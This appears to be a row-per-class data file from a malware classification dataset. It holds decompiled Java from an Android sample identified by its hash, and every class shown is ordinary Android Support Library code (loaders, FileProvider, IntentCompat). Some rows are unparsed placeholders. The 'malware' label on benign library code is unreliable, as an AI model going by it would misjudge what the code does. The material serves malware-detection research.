loadInBackground();   }   public void waitForLoader(){     AsyncTaskLoader<D>.LoadTask task=this.mTask;     if (task != null) {       try {         ((LoadTask)task).done.await();       }  catch (      InterruptedException e) {       }     }   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     if (this.mTask != null) {       writer.print(prefix);       writer.print(""mTask="");       writer.print(this.mTask);       writer.print("" waiting="");       writer.println(this.mTask.waiting);     }     if (this.mCancellingTask != null) {       writer.print(prefix);       writer.print(""mCancellingTask="");       writer.print(this.mCancellingTask);       writer.print("" waiting="");       writer.println(this.mCancellingTask.waiting);     }     if (this.mUpdateThrottle != 0) {       writer.print(prefix);       writer.print(""mUpdateThrottle="");       TimeUtils.formatDuration(this.mUpdateThrottle,writer);       writer.print("" mLastLoadCompleteTime="");       TimeUtils.formatDuration(this.mLastLoadCompleteTime,SystemClock.uptimeMillis(),writer);       writer.println();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\AsyncTaskResult.code","public static class AsyncTaskResult<Data> {   final Data[] mData;   final ModernAsyncTask mTask;   AsyncTaskResult(  ModernAsyncTask task,  Data... data){     this.mTask=task;     this.mData=data;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\BroadcastRecord.code","public static class BroadcastRecord {   final Intent intent;   final ArrayList<ReceiverRecord> receivers;   BroadcastRecord(  Intent _intent,  ArrayList<ReceiverRecord> _receivers){     this.intent=_intent;     this.receivers=_receivers;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ContextCompat.code","public class ContextCompat {   private static final String DIR_ANDROID=""Android"";   private static final String DIR_CACHE=""cache"";   private static final String DIR_DATA=""data"";   private static final String DIR_FILES=""files"";   private static final String DIR_OBB=""obb"";   public static boolean startActivities(  Context context,  Intent[] intents){     return startActivities(context,intents,null);   }   public static boolean startActivities(  Context context,  Intent[] intents,  Bundle options){     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       ContextCompatJellybean.startActivities(context,intents,options);       return true;     }     if (version >= 11) {       ContextCompatHoneycomb.startActivities(context,intents);       return true;     }     return false;   }   public static File[] getObbDirs(  Context context){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getObbDirs(context);     }     if (version >= 11) {       single=ContextCompatHoneycomb.getObbDir(context);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_OBB,context.getPackageName());     }     return new File[]{single};   }   public static File[] getExternalFilesDirs(  Context context,  String type){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getExternalFilesDirs(context,type);     }     if (version >= 8) {       single=ContextCompatFroyo.getExternalFilesDir(context,type);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_DATA,context.getPackageName(),DIR_FILES,type);     }     return new File[]{single};   }   public static File[] getExternalCacheDirs(  Context context){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getExternalCacheDirs(context);     }     if (version >= 8) {       single=ContextCompatFroyo.getExternalCacheDir(context);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_DATA,context.getPackageName(),DIR_CACHE);     }     return new File[]{single};   }   private static File buildPath(  File base,  String... segments){     File cur;     int len$=segments.length;     int i$=0;     File cur2=base;     while (i$ < len$) {       String segment=segments[i$];       if (cur2 == null) {         cur=new File(segment);       }  else {         cur=segment != null ? new File(cur2,segment) : cur2;       }       i$++;       cur2=cur;     }     return cur2;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ContextCompatFroyo.code","class ContextCompatFroyo {   ContextCompatFroyo(){   }   public static File getExternalCacheDir(  Context context){     return context.getExternalCacheDir();   }   public static File getExternalFilesDir(  Context context,  String type){     return context.getExternalFilesDir(type);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ContextCompatHoneycomb.code","class ContextCompatHoneycomb {   ContextCompatHoneycomb(){   }   public static void startActivities(  Context context,  Intent[] intents){     context.startActivities(intents);   }   public static File getObbDir(  Context context){     return context.getObbDir();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ContextCompatJellybean.code","class ContextCompatJellybean {   ContextCompatJellybean(){   }   public static void startActivities(  Context context,  Intent[] intents,  Bundle options){     context.startActivities(intents,options);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ContextCompatKitKat.code","class ContextCompatKitKat {   ContextCompatKitKat(){   }   public static File[] getExternalCacheDirs(  Context context){     return context.getExternalCacheDirs();   }   public static File[] getExternalFilesDirs(  Context context,  String type){     return context.getExternalFilesDirs(type);   }   public static File[] getObbDirs(  Context context){     return context.getObbDirs();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\CursorLoader.code","public class CursorLoader extends AsyncTaskLoader<Cursor> {   Cursor mCursor;   final Loader<Cursor>.ForceLoadContentObserver mObserver;   String[] mProjection;   String mSelection;   String[] mSelectionArgs;   String mSortOrder;   Uri mUri;   @Override public Cursor loadInBackground(){     Cursor cursor=getContext().getContentResolver().query(this.mUri,this.mProjection,this.mSelection,this.mSelectionArgs,this.mSortOrder);     if (cursor != null) {       cursor.getCount();       cursor.registerContentObserver(this.mObserver);     }     return cursor;   }   @Override public void deliverResult(  Cursor cursor){     if (isReset()) {       if (cursor != null) {         cursor.close();         return;       }       return;     }     Cursor oldCursor=this.mCursor;     this.mCursor=cursor;     if (isStarted()) {       super.deliverResult((CursorLoader)cursor);     }     if (oldCursor != null && oldCursor != cursor && !oldCursor.isClosed()) {       oldCursor.close();     }   }   public CursorLoader(  Context context){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();   }   public CursorLoader(  Context context,  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();     this.mUri=uri;     this.mProjection=projection;     this.mSelection=selection;     this.mSelectionArgs=selectionArgs;     this.mSortOrder=sortOrder;   }   @Override protected void onStartLoading(){     if (this.mCursor != null) {       deliverResult(this.mCursor);     }     if (takeContentChanged() || this.mCursor == null) {       forceLoad();     }   }   @Override protected void onStopLoading(){     cancelLoad();   }   @Override public void onCanceled(  Cursor cursor){     if (cursor != null && !cursor.isClosed()) {       cursor.close();     }   }   @Override public void onReset(){     super.onReset();     onStopLoading();     if (this.mCursor != null && !this.mCursor.isClosed()) {       this.mCursor.close();     }     this.mCursor=null;   }   public Uri getUri(){     return this.mUri;   }   public void setUri(  Uri uri){     this.mUri=uri;   }   public String[] getProjection(){     return this.mProjection;   }   public void setProjection(  String[] projection){     this.mProjection=projection;   }   public String getSelection(){     return this.mSelection;   }   public void setSelection(  String selection){     this.mSelection=selection;   }   public String[] getSelectionArgs(){     return this.mSelectionArgs;   }   public void setSelectionArgs(  String[] selectionArgs){     this.mSelectionArgs=selectionArgs;   }   public String getSortOrder(){     return this.mSortOrder;   }   public void setSortOrder(  String sortOrder){     this.mSortOrder=sortOrder;   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     writer.print(prefix);     writer.print(""mUri="");     writer.println(this.mUri);     writer.print(prefix);     writer.print(""mProjection="");     writer.println(Arrays.toString(this.mProjection));     writer.print(prefix);     writer.print(""mSelection="");     writer.println(this.mSelection);     writer.print(prefix);     writer.print(""mSelectionArgs="");     writer.println(Arrays.toString(this.mSelectionArgs));     writer.print(prefix);     writer.print(""mSortOrder="");     writer.println(this.mSortOrder);     writer.print(prefix);     writer.print(""mCursor="");     writer.println(this.mCursor);     writer.print(prefix);     writer.print(""mContentChanged="");     writer.println(this.mContentChanged);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\FileProvider.code","public class FileProvider extends ContentProvider {   private static final String ATTR_NAME=""name"";   private static final String ATTR_PATH=""path"";   private static final String META_DATA_FILE_PROVIDER_PATHS=""android.support.FILE_PROVIDER_PATHS"";   private static final String TAG_CACHE_PATH=""cache-path"";   private static final String TAG_EXTERNAL=""external-path"";   private static final String TAG_FILES_PATH=""files-path"";   private static final String TAG_ROOT_PATH=""root-path"";   private PathStrategy mStrategy;   private static final String[] COLUMNS={""_display_name"",""_size""};   private static final File DEVICE_ROOT=new File(""/"");   private static HashMap<String,PathStrategy> sCache=new HashMap<>(); public interface PathStrategy {     File getFileForUri(    Uri uri);     Uri getUriForFile(    File file);   }   @Override public boolean onCreate(){     return true;   }   @Override public void attachInfo(  Context context,  ProviderInfo info){     super.attachInfo(context,info);     if (info.exported) {       throw new SecurityException(""Provider must not be exported"");     }     if (!info.grantUriPermissions) {       throw new SecurityException(""Provider must grant uri permissions"");     }     this.mStrategy=getPathStrategy(context,info.authority);   }   public static Uri getUriForFile(  Context context,  String authority,  File file){     PathStrategy strategy=getPathStrategy(context,authority);     return strategy.getUriForFile(file);   }   @Override public Cursor query(  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     int i;     File file=this.mStrategy.getFileForUri(uri);     if (projection == null) {       projection=COLUMNS;     }     String[] cols=new String[projection.length];     Object[] values=new Object[projection.length];     String[] arr$=projection;     int len$=arr$.length;     int i$=0;     int i2=0;     while (i$ < len$) {       String col=arr$[i$];       if (""_display_name"".equals(col)) {         cols[i2]=""_display_name"";         i=i2 + 1;         values[i2]=file.getName();       }  else       if (""_size"".equals(col)) {         cols[i2]=""_size"";         i=i2 + 1;         values[i2]=Long.valueOf(file.length());       }  else {         i=i2;       }       i$++;       i2=i;     }     String[] cols2=copyOf(cols,i2);     Object[] values2=copyOf(values,i2);     MatrixCursor cursor=new MatrixCursor(cols2,1);     cursor.addRow(values2);     return cursor;   }   @Override public String getType(  Uri uri){     File file=this.mStrategy.getFileForUri(uri);     int lastDot=file.getName().lastIndexOf(46);     if (lastDot >= 0) {       String extension=file.getName().substring(lastDot + 1);       String mime=MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);       if (mime != null) {         return mime;       }     }     return ""application/octet-stream"";   }   @Override public Uri insert(  Uri uri,  ContentValues values){     throw new UnsupportedOperationException(""No external inserts"");   }   @Override public int update(  Uri uri,  ContentValues values,  String selection,  String[] selectionArgs){     throw new UnsupportedOperationException(""No external updates"");   }   @Override public int delete(  Uri uri,  String selection,  String[] selectionArgs){     File file=this.mStrategy.getFileForUri(uri);     return file.delete() ? 1 : 0;   }   @Override public ParcelFileDescriptor openFile(  Uri uri,  String mode) throws FileNotFoundException {     File file=this.mStrategy.getFileForUri(uri);     int fileMode=modeToMode(mode);     return ParcelFileDescriptor.open(file,fileMode);   }   private static PathStrategy getPathStrategy(  Context context,  String authority){     PathStrategy strat; synchronized (sCache) {       strat=sCache.get(authority);       if (strat == null) {         try {           try {             strat=parsePathStrategy(context,authority);             sCache.put(authority,strat);           }  catch (          IOException e) {             throw new IllegalArgumentException(""Failed to parse android.support.FILE_PROVIDER_PATHS meta-data"",e);           }         }  catch (        XmlPullParserException e2) {           throw new IllegalArgumentException(""Failed to parse android.support.FILE_PROVIDER_PATHS meta-data"",e2);         }       }     }     return strat;   }   private static PathStrategy parsePathStrategy(  Context context,  String authority) throws IOException, XmlPullParserException {     SimplePathStrategy strat=new SimplePathStrategy(authority);     ProviderInfo info=context.getPackageManager().resolveContentProvider(authority,128);     XmlResourceParser in=info.loadXmlMetaData(context.getPackageManager(),META_DATA_FILE_PROVIDER_PATHS);     if (in == null) {       throw new IllegalArgumentException(""Missing android.support.FILE_PROVIDER_PATHS meta-data"");     }     while (true) {       int type=in.next();       if (type != 1) {         if (type == 2) {           String tag=in.getName();           String name=in.getAttributeValue(null,ATTR_NAME);           String path=in.getAttributeValue(null,ATTR_PATH);           File target=null;           if (TAG_ROOT_PATH.equals(tag)) {             target=buildPath(DEVICE_ROOT,path);           }  else           if (TAG_FILES_PATH.equals(tag)) {             target=buildPath(context.getFilesDir(),path);           }  else           if (TAG_CACHE_PATH.equals(tag)) {             target=buildPath(context.getCacheDir(),path);           }  else           if (TAG_EXTERNAL.equals(tag)) {             target=buildPath(Environment.getExternalStorageDirectory(),path);           }           if (target != null) {             strat.addRoot(name,target);           }         }       }  else {         return strat;       }     }   } public static class SimplePathStrategy implements PathStrategy {     private final String mAuthority;     private final HashMap<String,File> mRoots=new HashMap<>();     public SimplePathStrategy(    String authority){       this.mAuthority=authority;     }     public void addRoot(    String name,    File root){       if (TextUtils.isEmpty(name)) {         throw new IllegalArgumentException(""Name must not be empty"");       }       try {         this.mRoots.put(name,root.getCanonicalFile());       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + root,e);       }     }     @Override public Uri getUriForFile(    File file){       String path;       try {         String path2=file.getCanonicalPath();         Map.Entry<String,File> mostSpecific=null;         for (        Map.Entry<String,File> root : this.mRoots.entrySet()) {           String rootPath=root.getValue().getPath();           if (path2.startsWith(rootPath) && (mostSpecific == null || rootPath.length() > mostSpecific.getValue().getPath().length())) {             mostSpecific=root;           }         }         if (mostSpecific == null) {           throw new IllegalArgumentException(""Failed to find configured root that contains "" + path2);         }         String rootPath2=mostSpecific.getValue().getPath();         if (rootPath2.endsWith(""/"")) {           path=path2.substring(rootPath2.length());         }  else {           path=path2.substring(rootPath2.length() + 1);         }         return new Uri.Builder().scheme(""content"").authority(this.mAuthority).encodedPath(Uri.encode(mostSpecific.getKey()) + '/' + Uri.encode(path,""/"")).build();       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);       }     }     @Override public File getFileForUri(    Uri uri){       String path=uri.getEncodedPath();       int splitIndex=path.indexOf(47,1);       String tag=Uri.decode(path.substring(1,splitIndex));       String path2=Uri.decode(path.substring(splitIndex + 1));       File root=this.mRoots.get(tag);       if (root == null) {         throw new IllegalArgumentException(""Unable to find configured root for "" + uri);       }       File file=new File(root,path2);       try {         File file2=file.getCanonicalFile();         if (!file2.getPath().startsWith(root.getPath())) {           throw new SecurityException(""Resolved path jumped beyond configured root"");         }         return file2;       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);       }     }   }   private static int modeToMode(  String mode){     if (""r"".equals(mode)) {       return 268435456;     }     if (""w"".equals(mode) || ""wt"".equals(mode)) {       return 738197504;     }     if (""wa"".equals(mode)) {       return 704643072;     }     if (""rw"".equals(mode)) {       return 939524096;     }     if (""rwt"".equals(mode)) {       return 1006632960;     }     throw new IllegalArgumentException(""Invalid mode: "" + mode);   }   private static File buildPath(  File base,  String... segments){     int len$=segments.length;     int i$=0;     File cur=base;     while (i$ < len$) {       String segment=segments[i$];       i$++;       cur=segment != null ? new File(cur,segment) : cur;     }     return cur;   }   private static String[] copyOf(  String[] original,  int newLength){     String[] result=new String[newLength];     System.arraycopy(original,0,result,0,newLength);     return result;   }   private static Object[] copyOf(  Object[] original,  int newLength){     Object[] result=new Object[newLength];     System.arraycopy(original,0,result,0,newLength);     return result;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ForceLoadContentObserver.code","public final class ForceLoadContentObserver extends ContentObserver {   public ForceLoadContentObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     Loader.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompat.code","public class IntentCompat {   public static final String ACTION_EXTERNAL_APPLICATIONS_AVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"";   public static final String ACTION_EXTERNAL_APPLICATIONS_UNAVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE"";   public static final String EXTRA_CHANGED_PACKAGE_LIST=""android.intent.extra.changed_package_list"";   public static final String EXTRA_CHANGED_UID_LIST=""android.intent.extra.changed_uid_list"";   public static final String EXTRA_HTML_TEXT=""android.intent.extra.HTML_TEXT"";   public static final int FLAG_ACTIVITY_CLEAR_TASK=32768;   public static final int FLAG_ACTIVITY_TASK_ON_HOME=16384;   private static final IntentCompatImpl IMPL; interface IntentCompatImpl {     Intent makeMainActivity(    ComponentName componentName);     Intent makeMainSelectorActivity(    String str,    String str2);     Intent makeRestartActivityTask(    ComponentName componentName);   } static class IntentCompatImplBase implements IntentCompatImpl {     IntentCompatImplBase(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       Intent intent=new Intent(""android.intent.action.MAIN"");       intent.setComponent(componentName);       intent.addCategory(""android.intent.category.LAUNCHER"");       return intent;     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       Intent intent=new Intent(selectorAction);       intent.addCategory(selectorCategory);       return intent;     }     @Override public Intent makeRestartActivityTask(    ComponentName mainActivity){       Intent intent=makeMainActivity(mainActivity);       intent.addFlags(268468224);       return intent;     }   } static class IntentCompatImplHC extends IntentCompatImplBase {     IntentCompatImplHC(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       return IntentCompatHoneycomb.makeMainActivity(componentName);     }     @Override public Intent makeRestartActivityTask(    ComponentName componentName){       return IntentCompatHoneycomb.makeRestartActivityTask(componentName);     }   } static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {     IntentCompatImplIcsMr1(){     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 15) {       IMPL=new IntentCompatImplIcsMr1();     }  else     if (version >= 11) {       IMPL=new IntentCompatImplHC();     }  else {       IMPL=new IntentCompatImplBase();     }   }   private IntentCompat(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return IMPL.makeMainActivity(mainActivity);   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IMPL.makeMainSelectorActivity(selectorAction,selectorCategory);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return IMPL.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompatHoneycomb.code","class IntentCompatHoneycomb {   IntentCompatHoneycomb(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return Intent.makeMainActivity(mainActivity);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return Intent.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompatIcsMr1.code","class IntentCompatIcsMr1 {   IntentCompatIcsMr1(){   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return Intent.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompatImpl.code","interface IntentCompatImpl {   Intent makeMainActivity(  ComponentName componentName);   Intent makeMainSelectorActivity(  String str,  String str2);   Intent makeRestartActivityTask(  ComponentName componentName); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompatImplBase.code","static class IntentCompatImplBase implements IntentCompatImpl {   IntentCompatImplBase(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.setComponent(componentName);     intent.addCategory(""android.intent.category.LAUNCHER"");     return intent;   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     Intent intent=new Intent(selectorAction);     intent.addCategory(selectorCategory);     return intent;   }   @Override public Intent makeRestartActivityTask(  ComponentName mainActivity){     Intent intent=makeMainActivity(mainActivity);     intent.addFlags(268468224);     return intent;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompatImplHC.code","static class IntentCompatImplHC extends IntentCompatImplBase {   IntentCompatImplHC(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     return IntentCompatHoneycomb.makeMainActivity(componentName);   }   @Override public Intent makeRestartActivityTask(  ComponentName componentName){     return IntentCompatHoneycomb.makeRestartActivityTask(componentName);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\IntentCompatImplIcsMr1.code","static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {   IntentCompatImplIcsMr1(){   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\InternalHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3ce11cf5"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\Loader.code","public class Loader<D> {   Context mContext;   int mId;   OnLoadCompleteListener<D> mListener;   boolean mStarted=false;   boolean mAbandoned=false;   boolean mReset=true;   boolean mContentChanged=false;   boolean mProcessingChange=false; public interface OnLoadCompleteListener<D> {     void onLoadComplete(    Loader<D> loader,    D d);   } public final class ForceLoadContentObserver extends ContentObserver {     public ForceLoadContentObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       Loader.this.onContentChanged();     }   }   public Loader(  Context context){     this.mContext=context.getApplicationContext();   }   public void deliverResult(  D data){     if (this.mListener != null) {       this.mListener.onLoadComplete(this,data);     }   }   public Context getContext(){     return this.mContext;   }   public int getId(){     return this.mId;   }   public void registerListener(  int id,  OnLoadCompleteListener<D> listener){     if (this.mListener != null) {       throw new IllegalStateException(""There is already a listener registered"");     }     this.mListener=listener;     this.mId=id;   }   public void unregisterListener(  OnLoadCompleteListener<D> listener){     if (this.mListener == null) {       throw new IllegalStateException(""No listener register"");     }     if (this.mListener != listener) {       throw new IllegalArgumentException(""Attempting to unregister the wrong listener"");     }     this.mListener=null;   }   public boolean isStarted(){     return this.mStarted;   }   public boolean isAbandoned(){     return this.mAbandoned;   }   public boolean isReset(){     return this.mReset;   }   public final void startLoading(){     this.mStarted=true;     this.mReset=false;     this.mAbandoned=false;     onStartLoading();   }   protected void onStartLoading(){   }   public void forceLoad(){     onForceLoad();   }   public void onForceLoad(){   }   public void stopLoading(){     this.mStarted=false;     onStopLoading();   }   protected void onStopLoading(){   }   public void abandon(){     this.mAbandoned=true;     onAbandon();   }   protected void onAbandon(){   }   public void reset(){     onReset();     this.mReset=true;     this.mStarted=false;     this.mAbandoned=false;     this.mContentChanged=false;     this.mProcessingChange=false;   }   public void onReset(){   }   public boolean takeContentChanged(){     boolean res=this.mContentChanged;     this.mContentChanged=false;     this.mProcessingChange|=res;     return res;   }   public void commitContentChanged(){     this.mProcessingChange=false;   }   public void rollbackContentChanged(){     if (this.mProcessingChange) {       this.mContentChanged=true;     }   }   public void onContentChanged(){     if (this.mStarted) {       forceLoad();     }  else {       this.mContentChanged=true;     }   }   public String dataToString(  D data){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(data,sb);     sb.append(""}"");     return sb.toString();   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(this,sb);     sb.append("" id="");     sb.append(this.mId);     sb.append(""}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mListener="");     writer.println(this.mListener);     if (this.mStarted || this.mContentChanged || this.mProcessingChange) {       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mContentChanged="");       writer.print(this.mContentChanged);       writer.print("" mProcessingChange="");       writer.println(this.mProcessingChange);     }     if (this.mAbandoned || this.mReset) {       writer.print(prefix);       writer.print(""mAbandoned="");       writer.print(this.mAbandoned);       writer.print("" mReset="");       writer.println(this.mReset);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\LoadTask.code","public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {   private CountDownLatch done=new CountDownLatch(1);   D result;   boolean waiting;   LoadTask(){   }   @Override public D doInBackground(  Void... voidArr){     this.result=(D)AsyncTaskLoader.this.onLoadInBackground();     return this.result;   }   @Override protected void onPostExecute(  D data){     try {       AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);     }   finally {       this.done.countDown();     }   }   @Override protected void onCancelled(){     try {       AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);     }   finally {       this.done.countDown();     }   }   @Override public void run(){     this.waiting=AsyncTaskLoader.DEBUG;     AsyncTaskLoader.this.executePendingTask();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\LocalBroadcastManager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@24614b8a"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ModernAsyncTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e4ee95b"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\OnLoadCompleteListener.code","public interface OnLoadCompleteListener<D> {   void onLoadComplete(  Loader<D> loader,  D d); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\PathStrategy.code","public interface PathStrategy {   File getFileForUri(  Uri uri);   Uri getUriForFile(  File file); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\ReceiverRecord.code","public static class ReceiverRecord {   boolean broadcasting;   final IntentFilter filter;   final BroadcastReceiver receiver;   ReceiverRecord(  IntentFilter _filter,  BroadcastReceiver _receiver){     this.filter=_filter;     this.receiver=_receiver;   }   public String toString(){     StringBuilder builder=new StringBuilder(128);     builder.append(""Receiver{"");     builder.append(this.receiver);     builder.append("" filter="");     builder.append(this.filter);     builder.append(""}"");     return builder.toString();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\SimplePathStrategy.code","public static class SimplePathStrategy implements PathStrategy {   private final String mAuthority;   private final HashMap<String,File> mRoots=new HashMap<>();   public SimplePathStrategy(  String authority){     this.mAuthority=authority;   }   public void addRoot(  String name,  File root){     if (TextUtils.isEmpty(name)) {       throw new IllegalArgumentException(""Name must not be empty"");     }     try {       this.mRoots.put(name,root.getCanonicalFile());     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + root,e);     }   }   @Override public Uri getUriForFile(  File file){     String path;     try {       String path2=file.getCanonicalPath();       Map.Entry<String,File> mostSpecific=null;       for (      Map.Entry<String,File> root : this.mRoots.entrySet()) {         String rootPath=root.getValue().getPath();         if (path2.startsWith(rootPath) && (mostSpecific == null || rootPath.length() > mostSpecific.getValue().getPath().length())) {           mostSpecific=root;         }       }       if (mostSpecific == null) {         throw new IllegalArgumentException(""Failed to find configured root that contains "" + path2);       }       String rootPath2=mostSpecific.getValue().getPath();       if (rootPath2.endsWith(""/"")) {         path=path2.substring(rootPath2.length());       }  else {         path=path2.substring(rootPath2.length() + 1);       }       return new Uri.Builder().scheme(""content"").authority(this.mAuthority).encodedPath(Uri.encode(mostSpecific.getKey()) + '/' + Uri.encode(path,""/"")).build();     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);     }   }   @Override public File getFileForUri(  Uri uri){     String path=uri.getEncodedPath();     int splitIndex=path.indexOf(47,1);     String tag=Uri.decode(path.substring(1,splitIndex));     String path2=Uri.decode(path.substring(splitIndex + 1));     File root=this.mRoots.get(tag);     if (root == null) {       throw new IllegalArgumentException(""Unable to find configured root for "" + uri);     }     File file=new File(root,path2);     try {       File file2=file.getCanonicalFile();       if (!file2.getPath().startsWith(root.getPath())) {         throw new SecurityException(""Resolved path jumped beyond configured root"");       }       return file2;     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);     }   } } "
